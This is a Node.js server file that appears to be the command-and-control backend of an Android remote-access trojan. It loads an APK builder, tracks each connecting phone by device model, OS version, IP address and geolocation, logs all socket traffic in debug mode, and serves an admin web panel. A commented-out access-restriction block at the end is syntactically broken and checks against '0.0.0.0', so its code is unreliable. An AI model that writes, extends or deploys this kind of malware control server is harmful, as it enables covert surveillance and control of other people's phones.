const
    express = require('express'),
    app = express(),
    IO = require('socket.io'),
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

let client_io = IO.listen(CONST.control_port);

client_io.sockets.pingInterval = 30000;
client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }

});


// my initial thoughts on admin sys
app.listen(CONST.web_port);

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));


// I am clueless about the next four lines of code. Akin suggested it

const dotenv = require('dotenv');

dotenv.config();

const myVar = process.env.PORT;
console.log(myVar);

// God abeg o! 

//try this if the initial admin system don't work, here, just specify the IP you want to restrict access to
/*
app.listen(CONST.web_port);

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use('*', function(req, res, next) {
    // you can do your filtering here, call a `res` method if you want to stop progress or call `next` to proceed - totally depends on you
    var ip = req.ip || 
             req.headers['x-forwarded-for'] || 
             req.connection.remoteAddress || 
             req.socket.remoteAddress ||
             req.connection.socket.remoteAddress;

     // I made this array to enable you specify your access IP
     if (ip == '0.0.0.0') {
       next();
     } else {
        res.end('Access Denied.');
     }
}
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

*/